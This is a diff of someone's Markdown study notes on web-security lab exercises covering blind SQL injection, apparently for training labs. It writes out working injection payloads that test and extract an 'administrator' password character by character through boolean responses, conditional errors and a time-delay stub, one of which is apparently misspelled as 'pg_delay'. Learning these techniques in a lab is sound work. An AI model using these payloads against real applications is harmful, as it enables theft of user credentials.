@@ -101,12 +101,14 @@ now we need to get all content of the database notice that we will use **informa
    send the request to the repeater and try:
 
    - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 1) = 'administrator'-- ===> welcome back returned so the length of the password is > 1 ofc
-   - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 30) = 'administrator'-- ===> welcome back not returned so the length of the password is less then 30
+
+   trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 30) = 'administrator'-- ===> welcome back not returned so the length of the password is less then 30
 
    after send the request to the intreducer and add the params start the and find the right length
 
 3. enumerate the password using cluster bomb attack:
    after sending the request to the intruder and use brut forcer:
+
    ' and (select substring(password,$1$,1) from users where username = 'administrator') = '$a$' --
 
 ---
@@ -114,20 +116,30 @@ now we need to get all content of the database notice that we will use **informa
 ## LAB 11 -- Blind SQL injection with conditional errors:
 
 1. first let's inject sql code that cause an error and see if the website is vulnerable using this code:
+
    trackingID' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    noticed that you will recieve internal error
 
 2. let's check if 'administrator' user is there:
+
    '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    if the user exist the condition will be executed otherwise it'll not
 
 3. password length enumuration:
+
    '||(SELECT CASE WHEN LENGTH(password)=$1$ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    when the right length found an error will accured
 
 4. password enumuration:
+
    '||(SELECT+CASE+WHEN+SUBSTR(password,13,1)%3d'w'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'
 
 ---
 
-## LAB 12 --
+## LAB 12 -- Blind SQL injection with time delays
+
+1. in this lab sql errors are cathes so we can't get any indices by causing errors, here where time delays comes inject code who effect response time like this code
+
+   pg_delay(10)
+
+here the server waits for 10 seconds before sending a response
